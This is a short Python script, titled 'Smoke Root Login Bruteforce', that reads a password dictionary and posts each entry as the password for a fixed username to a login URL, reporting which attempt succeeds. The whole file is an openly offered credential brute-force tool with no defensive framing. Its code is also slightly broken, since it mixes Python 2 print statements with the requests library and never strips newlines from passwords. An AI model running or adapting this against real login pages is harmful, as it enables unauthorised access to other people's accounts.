########################################
# ->         Smoke Root             <- #
# ->                                <- #
# ->       LOGIN BRUTEFORCE         <- #
# ->          DEVELOPED             <- #
# ->             IN                 <- #
# ->           PYTHON               <- #
# ->                                <- #
# ->       DATE: 08/21/2021         <- #
########################################

import requests

url = 'LINK' #LINK EX: http(s)://www.google.com.br/

FILE = open('DICTIONARY.txt')
LINES = FILE.readlines()

for LINE in LINES:
    dados = {'username': 'example@example.com',
             'password': LINE}

    ANSWER = requests.post(url, data=dados)

    if "INCORRECT PASSWORD" in ANSWER.text:
        print "INCORRECT PASSWORD:", LINE
    else:
        print "CORRECT PASSWORD:", LINE